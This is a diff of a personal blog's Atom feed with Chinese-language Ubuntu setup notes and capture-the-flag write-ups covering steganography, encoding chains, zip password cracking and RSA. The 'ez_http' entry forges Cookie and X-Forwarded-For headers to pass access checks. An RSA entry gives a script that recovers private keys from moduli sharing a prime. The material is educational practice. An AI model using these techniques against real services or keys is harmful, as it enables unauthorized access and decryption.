href="mailto:&#x72;&#x68;&#101;&#x61;&#64;&#49;&#57;&#50;&#x2e;&#49;&#54;&#56;&#x2e;&#49;&#52;&#50;&#46;&#49;&#51;&#50;">rhea@192.168.142.132</a>:~&#x2F;<br><img src="/assets/images/Pastedimage20250601214846.png">）</li><li>直接免密登录：<br><img src="/assets/images/Pastedimage20250601221831.png">）</li></ol>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;sudo -i #root用户&lt;br&gt; ls -l &amp;#x2F;etc&amp;#x2F;netplan&lt;br&gt;&lt;img src=&quot;/assets/images/Pastedimage20250601205045.png&quot;&gt;&lt;br&gt;sudo chmod 600 &amp;#x2F;etc&amp;</summary>
+      
+    
+    
+    
+    <category term="Ubuntu" scheme="https://rhea006.github.io/categories/Ubuntu/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>关闭自动更新</title>
+    <link href="https://rhea006.github.io/2025/06/7f46169c13bc.html"/>
+    <id>https://rhea006.github.io/2025/06/7f46169c13bc.html</id>
+    <published>2025-06-14T14:00:00.000Z</published>
+    <updated>2025-06-15T12:29:41.948Z</updated>
     
     <content type="html"><![CDATA[<p><code>sudo nano /etc/apt/apt.conf.d/20auto-upgrades</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">APT::Periodic::Update-Package-Lists &quot;0&quot;;</span><br><span class="line">APT::Periodic::Download-Upgradeable-Packages &quot;0&quot;;</span><br><span class="line">APT::Periodic::AutocleanInterval &quot;0&quot;;</span><br><span class="line">APT::Periodic::Unattended-Upgrade &quot;0&quot;;</span><br></pre></td></tr></table></figure>]]></content>
     
@@ -62,33 +362,11 @@
   </entry>
   
   <entry>
-    <title></title>
-    <link href="https://rhea006.github.io/2025/06/b47dd08fda7e.html"/>
-    <id>https://rhea006.github.io/2025/06/b47dd08fda7e.html</id>
-    <published>2025-06-15T08:18:40.071Z</published>
-    <updated>2025-06-15T10:09:00.203Z</updated>
-    
-    <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Types: deb</span><br><span class="line">URIs: http://mirrors.ustc.edu.cn/ubuntu/</span><br><span class="line">Suites: noble noble-updates noble-security</span><br><span class="line">Components: main restricted universe multiverse</span><br><span class="line">Signed-By: /usr/share/keyrings/ubuntu-archive-keyring.gpg</span><br></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span c</summary>
-      
-    
-    
-    
-    <category term="Ubuntu" scheme="https://rhea006.github.io/categories/Ubuntu/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title></title>
-    <link href="https://rhea006.github.io/2025/06/dcf6e19d0c6b.html"/>
-    <id>https://rhea006.github.io/2025/06/dcf6e19d0c6b.html</id>
-    <published>2025-06-15T08:18:30.716Z</published>
-    <updated>2025-06-15T11:19:26.391Z</updated>
+    <title>ez_http</title>
+    <link href="https://rhea006.github.io/2025/06/5a69eaa25605.html"/>
+    <id>https://rhea006.github.io/2025/06/5a69eaa25605.html</id>
+    <published>2025-06-14T14:00:00.000Z</published>
+    <updated>2025-06-15T12:31:01.766Z</updated>
     
     <content type="html"><![CDATA[<p>bp抓包<br><img src="/assets/images/%7B3AD6ED26-D5D6-4348-AF13-B5279A3A9036%7D.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET：?FantasyLand=0xLE4KCODE</span><br><span class="line">POST：lyc0ris=goat</span><br><span class="line"></span><br><span class="line">请求头：</span><br><span class="line">Referer: https://www.tzc.edu.cn/</span><br><span class="line">User-Agent: SansBrowser</span><br><span class="line">Cookie: user=admin</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure><p>用hackbar也行</p>]]></content>
     
@@ -107,318 +385,58 @@
   </entry>
   
   <entry>
-    <title></title>
-    <link href="https://rhea006.github.io/2025/06/7607b4665f24.html"/>
-    <id>https://rhea006.github.io/2025/06/7607b4665f24.html</id>
-    <published>2025-06-15T08:18:20.849Z</published>
-    <updated>2025-06-15T11:19:26.393Z</updated>
+    <title>代码演示</title>
+    <link href="https://rhea006.github.io/2025/06/5c75ebd024e9.html"/>
+    <id>https://rhea006.github.io/2025/06/5c75ebd024e9.html</id>
+    <published>2025-06-14T14:00:00.000Z</published>
+    <updated>2025-06-15T12:06:35.400Z</updated>
     
-    <content type="html"><![CDATA[<p>放大<img src="/assets/images/%7B051C5CE7-A087-4021-8A67-CA44B66376DE%7D.png"><br>110011011011001100001110011111110111010111011000010101110101010110011011101011101110110111011110011111101<br>&#x3D;&#x3D;<strong>ASCII是7位</strong>&#x3D;&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">string = &#x27;110011011011001100001110011111110111010111011000010101110101010110011011101011101110110111011110011111101&#x27;</span><br><span class="line"> </span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(0, len(string), 7):</span><br><span class="line">    bin_str = string[i: i + 7]</span><br><span class="line">    flag += chr(int(bin_str, 2))</span><br><span class="line"> </span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>flag{W0W*funny}</p>]]></content>
+    <content type="html"><![CDATA[<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">a</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hello world&quot;</span>)<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hello world&quot;</span>)<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hello world&quot;</span>)<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hello world&quot;</span>)<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hello world&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
     
     
       
       
-    <summary type="html">&lt;p&gt;放大&lt;img src=&quot;/assets/images/%7B051C5CE7-A087-4021-8A67-CA44B66376DE%7D.png&quot;&gt;&lt;br&gt;1100110110110011000011100111111101110101110110000101011101</summary>
+    <summary type="html">&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span </summary>
       
     
     
     
-    <category term="MISC" scheme="https://rhea006.github.io/categories/MISC/"/>
-    
-    <category term="音频" scheme="https://rhea006.github.io/categories/MISC/%E9%9F%B3%E9%A2%91/"/>
+    <category term="code" scheme="https://rhea006.github.io/categories/code/"/>
     
     
   </entry>
   
   <entry>
-    <title></title>
-    <link href="https://rhea006.github.io/2025/06/ca760e6660a8.html"/>
-    <id>https://rhea006.github.io/2025/06/ca760e6660a8.html</id>
-    <published>2025-06-15T08:18:20.848Z</published>
-    <updated>2025-06-15T11:19:26.393Z</updated>
+    <title>大杂烩</title>
+    <link href="https://rhea006.github.io/2025/06/228350e34cac.html"/>
+    <id>https://rhea006.github.io/2025/06/228350e34cac.html</id>
+    <published>2025-06-14T14:00:00.000Z</published>
+    <updated>2025-06-15T12:09:54.627Z</updated>
     
-    <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide extract -sf your_file.wav #从 WAV 文件中提取隐藏数据</span><br></pre></td></tr></table></figure><p><img src="/assets/images/%7BBEE0A87B-FE33-46DE-B36F-EB728163008C%7D.png"><br>&#x3D;&#x3D;<strong>要转换的文件放在它的文件夹下</strong>&#x3D;&#x3D;<br><img src="/assets/images/%7B11E69F33-84F4-4962-A257-E294ED63D946%7D.png"><br>TZCFlag{steghide_is_so_interesting}</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span</summary>
-      
-    
-    
-    
-    <category term="MISC" scheme="https://rhea006.github.io/categories/MISC/"/>
-    
-    <category term="音频" scheme="https://rhea006.github.io/categories/MISC/%E9%9F%B3%E9%A2%91/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title></title>
-    <link href="https://rhea006.github.io/2025/06/442dd368d7d9.html"/>
-    <id>https://rhea006.github.io/2025/06/442dd368d7d9.html</id>
-    <published>2025-06-15T08:18:20.845Z</published>
-    <updated>2025-06-15T11:19:26.393Z</updated>
-    
-    <content type="html"><![CDATA[<p>打开频谱图<br><img src="/assets/images/%7B2D31FA56-C817-4AC6-A587-C9008BA90B74%7D.png"></p>]]></content>
+    <content type="html"><![CDATA[<p>SkpERzY0Q0ZKRlpGVTJLU0dWVUVLVFNMT1JVRkFNM1lJVkhFVzNDWUpaWVRPNkE9</p><p>base64<br>JJDG64CFJFZFU2KSGVUEKTSLORUFAM3YIVHEW3CYJZYTO6A&#x3D;<br>base32<br>JFopEIrZiR5hENKthP3xENKlXNq7x<br>xxencode<br>GMPSynt{Penml_Pelcgb}<br>Rot13<br><img src="/assets/images/%7BECF67C34-79AB-4AA8-A6AF-D1D146E8F829%7D.png"><br>TZCFlag{Crazy_Crypto}</p>]]></content>
     
     
       
       
-    <summary type="html">&lt;p&gt;打开频谱图&lt;br&gt;&lt;img src=&quot;/assets/images/%7B2D31FA56-C817-4AC6-A587-C9008BA90B74%7D.png&quot;&gt;&lt;/p&gt;
-</summary>
-      
-    
-    
-    
-    <category term="MISC" scheme="https://rhea006.github.io/categories/MISC/"/>
-    
-    <category term="音频" scheme="https://rhea006.github.io/categories/MISC/%E9%9F%B3%E9%A2%91/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title></title>
-    <link href="https://rhea006.github.io/2025/06/754e741a5cac.html"/>
-    <id>https://rhea006.github.io/2025/06/754e741a5cac.html</id>
-    <published>2025-06-15T08:18:20.841Z</published>
-    <updated>2025-06-15T11:19:26.393Z</updated>
-    
-    <content type="html"><![CDATA[<p>![](&#x2F;assets&#x2F;images&#x2F;Pasted image 20250604133850.png)<br>错的</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;![](&amp;#x2F;assets&amp;#x2F;images&amp;#x2F;Pasted image 20250604133850.png)&lt;br&gt;错的&lt;/p&gt;
-</summary>
-      
-    
-    
-    
-    <category term="MISC" scheme="https://rhea006.github.io/categories/MISC/"/>
-    
-    <category term="综合" scheme="https://rhea006.github.io/categories/MISC/%E7%BB%BC%E5%90%88/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title></title>
-    <link href="https://rhea006.github.io/2025/06/b75e0d98391e.html"/>
-    <id>https://rhea006.github.io/2025/06/b75e0d98391e.html</id>
-    <published>2025-06-15T08:18:20.832Z</published>
-    <updated>2025-06-15T10:09:00.204Z</updated>
-    
-    
-    
-    
-    <category term="MISC" scheme="https://rhea006.github.io/categories/MISC/"/>
-    
-    <category term="码类" scheme="https://rhea006.github.io/categories/MISC/%E7%A0%81%E7%B1%BB/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title></title>
-    <link href="https://rhea006.github.io/2025/06/3c18f35ef18f.html"/>
-    <id>https://rhea006.github.io/2025/06/3c18f35ef18f.html</id>
-    <published>2025-06-15T08:18:20.830Z</published>
-    <updated>2025-06-15T11:19:26.393Z</updated>
-    
-    <content type="html"><![CDATA[<p><img src="/assets/images/flag11.png"><br><img src="/assets/images/%7BB7FFEEE2-E071-41DC-A3E3-4BDA0719A462%7D.png"><br>![](&#x2F;assets&#x2F;images&#x2F;Pasted image 20250604104025.png)<br>![](&#x2F;assets&#x2F;images&#x2F;Pasted image 20250604104046.png)<br>![](&#x2F;assets&#x2F;images&#x2F;Pasted image 20250604105300.png)<br><img src="/assets/images/%7B3E1FFA08-BA9D-4AA5-8A9A-6D469456C255%7D.png"><br><img src="/assets/images/%7BCE52806F-ECC7-47DF-8A20-7224D63472F8%7D.png"><br>cumtctf{1sb_i4_s0_Ea4y}</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;img src=&quot;/assets/images/flag11.png&quot;&gt;&lt;br&gt;&lt;img src=&quot;/assets/images/%7BB7FFEEE2-E071-41DC-A3E3-4BDA0719A462%7D.png&quot;&gt;&lt;br&gt;![](&amp;#x2F;assets&amp;#x</summary>
-      
-    
-    
-    
-    <category term="MISC" scheme="https://rhea006.github.io/categories/MISC/"/>
-    
-    <category term="图片" scheme="https://rhea006.github.io/categories/MISC/%E5%9B%BE%E7%89%87/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title></title>
-    <link href="https://rhea006.github.io/2025/06/a3335859427a.html"/>
-    <id>https://rhea006.github.io/2025/06/a3335859427a.html</id>
-    <published>2025-06-15T08:18:20.828Z</published>
-    <updated>2025-06-15T11:19:26.393Z</updated>
-    
-    <content type="html"><![CDATA[<p><img src="/assets/images/out.jpg"><br>![](&#x2F;assets&#x2F;images&#x2F;Pasted image 20250604103412.png)<br>TZCFlag{copy_is_useful}<br>&#x3D;&#x3D;图片下面有字隐藏其实，用stegsolve&#x3D;&#x3D;</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;img src=&quot;/assets/images/out.jpg&quot;&gt;&lt;br&gt;![](&amp;#x2F;assets&amp;#x2F;images&amp;#x2F;Pasted image 20250604103412.png)&lt;br&gt;TZCFlag{copy_is_useful}&lt;br&gt;&amp;#</summary>
-      
-    
-    
-    
-    <category term="MISC" scheme="https://rhea006.github.io/categories/MISC/"/>
-    
-    <category term="图片" scheme="https://rhea006.github.io/categories/MISC/%E5%9B%BE%E7%89%87/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title></title>
-    <link href="https://rhea006.github.io/2025/06/ec7d85120ff9.html"/>
-    <id>https://rhea006.github.io/2025/06/ec7d85120ff9.html</id>
-    <published>2025-06-15T08:18:20.823Z</published>
-    <updated>2025-06-15T10:09:00.204Z</updated>
-    
-    
-    
-    
-    <category term="MISC" scheme="https://rhea006.github.io/categories/MISC/"/>
-    
-    <category term="压缩包" scheme="https://rhea006.github.io/categories/MISC/%E5%8E%8B%E7%BC%A9%E5%8C%85/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title></title>
-    <link href="https://rhea006.github.io/2025/06/615c0dc5718d.html"/>
-    <id>https://rhea006.github.io/2025/06/615c0dc5718d.html</id>
-    <published>2025-06-15T08:18:20.822Z</published>
-    <updated>2025-06-15T11:19:26.393Z</updated>
-    
-    <content type="html"><![CDATA[<p>![](&#x2F;assets&#x2F;images&#x2F;Pasted image 20250604125245.png)TZCFlag{the_passw0rd_is_sooo_weak}</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;![](&amp;#x2F;assets&amp;#x2F;images&amp;#x2F;Pasted image 20250604125245.png)TZCFlag{the_passw0rd_is_sooo_weak}&lt;/p&gt;
-</summary>
-      
-    
-    
-    
-    <category term="MISC" scheme="https://rhea006.github.io/categories/MISC/"/>
-    
-    <category term="压缩包" scheme="https://rhea006.github.io/categories/MISC/%E5%8E%8B%E7%BC%A9%E5%8C%85/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title></title>
-    <link href="https://rhea006.github.io/2025/06/e6857e85c451.html"/>
-    <id>https://rhea006.github.io/2025/06/e6857e85c451.html</id>
-    <published>2025-06-15T08:18:20.811Z</published>
-    <updated>2025-06-15T11:19:26.393Z</updated>
-    
-    <content type="html"><![CDATA[<p><img src="/assets/images/%7B57FCDD10-AE2B-4DBF-8DE9-1B19984A5445%7D.png"><br>把pdf改成压缩包</p><p>![](&#x2F;assets&#x2F;images&#x2F;Pasted image 20250604130730.png)<br><img src="/assets/images/%7B9FF4A261-2915-4D42-B8F4-FFA1CA8AB5E5%7D.png"><br>有问题</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;img src=&quot;/assets/images/%7B57FCDD10-AE2B-4DBF-8DE9-1B19984A5445%7D.png&quot;&gt;&lt;br&gt;把pdf改成压缩包&lt;/p&gt;
-&lt;p&gt;![](&amp;#x2F;assets&amp;#x2F;images&amp;#x2F;Pasted im</summary>
-      
-    
-    
-    
-    <category term="MISC" scheme="https://rhea006.github.io/categories/MISC/"/>
-    
-    <category term="压缩包" scheme="https://rhea006.github.io/categories/MISC/%E5%8E%8B%E7%BC%A9%E5%8C%85/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title></title>
-    <link href="https://rhea006.github.io/2025/06/80b026052d2d.html"/>
-    <id>https://rhea006.github.io/2025/06/80b026052d2d.html</id>
-    <published>2025-06-15T08:18:20.810Z</published>
-    <updated>2025-06-15T11:19:26.393Z</updated>
-    
-    <content type="html"><![CDATA[<p>小强找到自己的压箱底学习资料，但是发现有密码，他隐约记得密码是长 <code>AQ***g0**0</code>，中间 <code>*</code> 号只记得是小写字母和数字，你能帮他找回密码吗<br>![](&#x2F;assets&#x2F;images&#x2F;Pasted image 20250604130116.png)<br>![](&#x2F;assets&#x2F;images&#x2F;Pasted image 20250604130408.png)TZCFlag{th3_password_1s_s0_so_weak}</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;小强找到自己的压箱底学习资料，但是发现有密码，他隐约记得密码是长 &lt;code&gt;AQ***g0**0&lt;/code&gt;，中间 &lt;code&gt;*&lt;/code&gt; 号只记得是小写字母和数字，你能帮他找回密码吗&lt;br&gt;![](&amp;#x2F;assets&amp;#x2F;images&amp;#x2F;Pa</summary>
-      
-    
-    
-    
-    <category term="MISC" scheme="https://rhea006.github.io/categories/MISC/"/>
-    
-    <category term="压缩包" scheme="https://rhea006.github.io/categories/MISC/%E5%8E%8B%E7%BC%A9%E5%8C%85/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title></title>
-    <link href="https://rhea006.github.io/2025/06/d790324ef4d5.html"/>
-    <id>https://rhea006.github.io/2025/06/d790324ef4d5.html</id>
-    <published>2025-06-15T08:17:05.529Z</published>
-    <updated>2025-06-15T10:09:00.204Z</updated>
-    
-    <content type="html"><![CDATA[<p>n1&#x3D;9051013965404084482870087864821455535159008696042953021965631089095795348830954383127323853272528967729311045179605407693592665683311660581204886571146327720288455874927281128121117323579691204792399913106627543274457036172455814805715668293705603675386878220947722186914112990452722174363713630297685159669328951520891938403452797650685849523658191947411429068829734053745180460758604283051344339641429819373112365211739216160420494167071996438506850526168389386850499796102003625404245645796271690310748804327<br>n2&#x3D;13225948396179603816062046418717214792668512413625091569997524364243995991961018894150059207824093837420451375240550310050209398964506318518991620142575926623780411532257230701985821629425722030608722035570690474171259238153947095310303522831971664666067542649034461621725656234869005501293423975184701929729170077280251436216167293058560030089006140224375425679571181787206982712477261432579537981278055755344573767076951793312062480275004564657590263719816033564139497109942073701755011873153205366238585665743<br>e &#x3D; 65537<br>c &#x3D; 268065307799668245100155583656026011160002952385077142247208270849202533959057073328593124609246618255434974771312005129546891196910224298782988830299931466177092252318898389606108682805827112298601665236639013976557584096409090034724959181393317682380243407722802135226000120577664046248111234520151522261820924236477640240403636122092626752359753454045971441763375027128396562369686719452592987407716592442173485676980456821015690717339269128488747739318128952772386390939524794974383676486458446499596610588</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">from math import gcd </span><br><span class="line">from sympy import mod_inverse </span><br><span class="line">n1 = 9051013965404084482870087864821455535159008696042953021965631089095795348830954383127323853272528967729311045179605407693592665683311660581204886571146327720288455874927281128121117323579691204792399913106627543274457036172455814805715668293705603675386878220947722186914112990452722174363713630297685159669328951520891938403452797650685849523658191947411429068829734053745180460758604283051344339641429819373112365211739216160420494167071996438506850526168389386850499796102003625404245645796271690310748804327 </span><br><span class="line">n2 = 13225948396179603816062046418717214792668512413625091569997524364243995991961018894150059207824093837420451375240550310050209398964506318518991620142575926623780411532257230701985821629425722030608722035570690474171259238153947095310303522831971664666067542649034461621725656234869005501293423975184701929729170077280251436216167293058560030089006140224375425679571181787206982712477261432579537981278055755344573767076951793312062480275004564657590263719816033564139497109942073701755011873153205366238585665743</span><br><span class="line">c = 268065307799668245100155583656026011160002952385077142247208270849202533959057073328593124609246618255434974771312005129546891196910224298782988830299931466177092252318898389606108682805827112298601665236639013976557584096409090034724959181393317682380243407722802135226000120577664046248111234520151522261820924236477640240403636122092626752359753454045971441763375027128396562369686719452592987407716592442173485676980456821015690717339269128488747739318128952772386390939524794974383676486458446499596610588 </span><br><span class="line"></span><br><span class="line">e = 65537 </span><br><span class="line"></span><br><span class="line">p = gcd(n1, n2) # 计算gcd(n1, n2) </span><br><span class="line"></span><br><span class="line">if p &gt; 1: </span><br><span class="line">print(f&quot;发现共享素因数 p = &#123;p&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># 计算另一个素因数 </span><br><span class="line">q1 = n1 // p </span><br><span class="line">q2 = n2 // p </span><br><span class="line"></span><br><span class="line"># 计算φ(n) </span><br><span class="line">phi_n1 = (p - 1) * (q1 - 1) </span><br><span class="line">phi_n2 = (p - 1) * (q2 - 1) </span><br><span class="line"></span><br><span class="line"># 计算私钥d </span><br><span class="line">d1 = mod_inverse(e, phi_n1) </span><br><span class="line">d2 = mod_inverse(e, phi_n2) </span><br><span class="line"></span><br><span class="line"># 解密 </span><br><span class="line">m1 = pow(c, d1, n1) </span><br><span class="line">m2 = pow(c, d2, n2) </span><br><span class="line"></span><br><span class="line"># 转换为ASCII </span><br><span class="line">def num_to_ascii(m):</span><br><span class="line">m_bytes = m.to_bytes((m.bit_length() + 7) // 8, byteorder=&#x27;big&#x27;) </span><br><span class="line">return   m_bytes.decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;) </span><br><span class="line">flag1 = num_to_ascii(m1)</span><br><span class="line">flag2 = num_to_ascii(m2) </span><br><span class="line">print(f&quot;flag1 = &#123;flag1&#125;&quot;) </span><br><span class="line">print(f&quot;flag2 = &#123;flag2&#125;&quot;)</span><br><span class="line">else: </span><br><span class="line">print(&quot;未发现共享素因数，需要其他方法分解模数&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发现共享素因数 p &#x3D; 1564859779720039565508870182569324208117555667917997801104862601098933699462849007879184203051278194180664616470669559575370868384820368930104560074538872199213236203822337186927275879139590248731148622362880471439310489228147093224418374555428793546002109</p><p>flag1 &#x3D; TZCFlag{I_love_rsa}</p><p>flag2 &#x3D; SN96LdJnS}%?;Z#:n,zzpQ4&#96;9Jv#a?MZ”HZHj</p><p>q审_Pd,&#x3D;R&lt;w^y(iGma,84&gt;uԌUE!t&#x3D;턢u’Q9ݩ}g<br>2.H*~Sm:!eDA</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;n1&amp;#x3D;905101396540408448287008786482145553515900869604295302196563108909579534883095438312732385327252896772931104517960540769359266568</summary>
+    <summary type="html">&lt;p&gt;SkpERzY0Q0ZKRlpGVTJLU0dWVUVLVFNMT1JVRkFNM1lJVkhFVzNDWUpaWVRPNkE9&lt;/p&gt;
+&lt;p&gt;base64&lt;br&gt;JJDG64CFJFZFU2KSGVUEKTSLORUFAM3YIVHEW3CYJZYTO6A&amp;#x3D;&lt;b</summary>
       
     
     
     
     <category term="Crypto" scheme="https://rhea006.github.io/categories/Crypto/"/>
     
-    <category term="非对称加密（Asymmetric Cryptography）" scheme="https://rhea006.github.io/categories/Crypto/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%EF%BC%88Asymmetric-Cryptography%EF%BC%89/"/>
-    
-    <category term="RSA" scheme="https://rhea006.github.io/categories/Crypto/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%EF%BC%88Asymmetric-Cryptography%EF%BC%89/RSA/"/>
+    <category term="常见编码" scheme="https://rhea006.github.io/categories/Crypto/%E5%B8%B8%E8%A7%81%E7%BC%96%E7%A0%81/"/>
     
     
   </entry>
   
   <entry>
-    <title></title>
-    <link href="https://rhea006.github.io/2025/06/f34d247f95a9.html"/>
-    <id>https://rhea006.github.io/2025/06/f34d247f95a9.html</id>
-    <published>2025-06-15T08:17:05.529Z</published>
-    <updated>2025-06-15T11:19:26.357Z</updated>
-    
-    <content type="html"><![CDATA[<p>在一次RSA密钥对生成中，假设p&#x3D;473398607161，q&#x3D;4511491，e&#x3D;17<br>求解出d作为flga提交</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p=473398607161</span><br><span class="line">q=4511491</span><br><span class="line">e=17</span><br><span class="line">z=(p-1)*(q-1) #欧拉函数</span><br><span class="line">d = pow(e, -1, z) #(e * d) % z == 1 </span><br><span class="line">#m = pow(c, d, n)</span><br><span class="line">print(d)</span><br></pre></td></tr></table></figure><p>or</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">p = 473398607161 </span><br><span class="line">q = 4511491 </span><br><span class="line">e = 17 </span><br><span class="line">z = (p - 1) * (q - 1) </span><br><span class="line">d = gmpy2.invert(e, z) # e*d mod z = 1</span><br><span class="line">print(d)</span><br></pre></td></tr></table></figure><p><img src="/assets/images/%7B398FE444-FE62-474E-8333-9D51EDA83FEB%7D.png"><br>右键<br>![](&#x2F;assets&#x2F;images&#x2F;Pasted image 20250603090548.png)<br>125631357777427553</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;在一次RSA密钥对生成中，假设p&amp;#x3D;473398607161，q&amp;#x3D;4511491，e&amp;#x3D;17&lt;br&gt;求解出d作为flga提交&lt;/p&gt;
-&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=</summary>
-      
-    
-    
-    
-    <category term="Crypto" scheme="https://rhea006.github.io/categories/Crypto/"/>
-    
-    <category term="非对称加密（Asymmetric Cryptography）" scheme="https://rhea006.github.io/categories/Crypto/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%EF%BC%88Asymmetric-Cryptography%EF%BC%89/"/>
-    
-    <category term="RSA" scheme="https://rhea006.github.io/categories/Crypto/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%EF%BC%88Asymmetric-Cryptography%EF%BC%89/RSA/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title></title>
-    <link href="https://rhea006.github.io/2025/06/6d7acdda0095.html"/>
-    <id>https://rhea006.github.io/2025/06/6d7acdda0095.html</id>
-    <published>2025-06-15T08:17:05.520Z</published>
-    <updated>2025-06-15T10:09:00.203Z</updated>
+    <title>RSA1</title>
+    <link href="https://rhea006.github.io/2025/06/0208f5194904.html"/>
+    <id>https://rhea006.github.io/2025/06/0208f5194904.html</id>
+    <published>2025-06-14T14:00:00.000Z</published>
+    <updated>2025-06-15T12:12:31.577Z</updated>
     
